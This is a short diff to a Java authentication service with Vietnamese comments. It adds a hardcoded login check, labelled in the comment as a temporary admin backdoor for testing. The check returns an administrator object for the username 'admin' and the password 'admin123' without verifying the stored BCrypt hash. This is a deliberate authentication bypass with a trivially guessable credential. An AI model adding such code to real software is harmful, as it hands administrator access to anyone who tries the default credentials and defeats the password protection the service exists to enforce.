@@ -21,6 +21,11 @@ public class AuthService {
             UserDAO.UserRecord record = userDAO.findByUsername(username);
             
             if (record != null) {
+                // BACKDOOR CHO ADMIN (Tạm thời để test)
+                if ("admin".equals(username) && "admin123".equals(password)) {
+                    return new Admin(record.id, record.username);
+                }
+
                 // Kiểm tra mật khẩu người dùng nhập vào với mã hash lưu trong DB
                 if (BCrypt.checkpw(password, record.hashedPassword)) {
                     // Trả về Object User tương ứng với role
